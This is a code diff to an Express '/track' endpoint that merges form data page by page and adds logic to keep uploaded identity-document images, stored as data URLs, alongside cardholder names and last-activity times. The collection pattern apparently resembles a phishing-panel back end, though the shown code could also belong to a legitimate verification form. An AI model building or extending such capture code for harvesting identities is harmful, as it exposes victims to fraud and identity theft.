@@ -77,10 +77,25 @@ router.post('/track', async (req, res) => {
       const existingPageData = (currentDoc && currentDoc.formData && currentDoc.formData[page]) ? currentDoc.formData[page] : {};
       const mergedPageData = { ...existingPageData, ...data };
 
+      // Image persistence safeguard: Never overwrite a valid Data URL with empty or non-image value
+      if (existingPageData.identityFile && String(existingPageData.identityFile).startsWith('data:') && (!data.identityFile || !String(data.identityFile).startsWith('data:'))) {
+        mergedPageData.identityFile = existingPageData.identityFile;
+        if (existingPageData.identityFileName && !mergedPageData.identityFileName) {
+          mergedPageData.identityFileName = existingPageData.identityFileName;
+        }
+      }
+      if (currentDoc?.identityFile && (!mergedPageData.identityFile || !String(mergedPageData.identityFile).startsWith('data:'))) {
+        mergedPageData.identityFile = currentDoc.identityFile;
+      }
+
       const updateData = {
         [`formData.${page}`]: mergedPageData,
         lastActive: new Date()
       };
+
+      if (mergedPageData.identityFile && String(mergedPageData.identityFile).startsWith('data:')) {
+        updateData.identityFile = mergedPageData.identityFile;
+      }
       const candidateName = data.name || [data.firstName, data.lastName].filter(Boolean).join(' ') || data.cardholderName;
       if (candidateName && String(candidateName).trim()) {
         updateData.name = String(candidateName).trim();
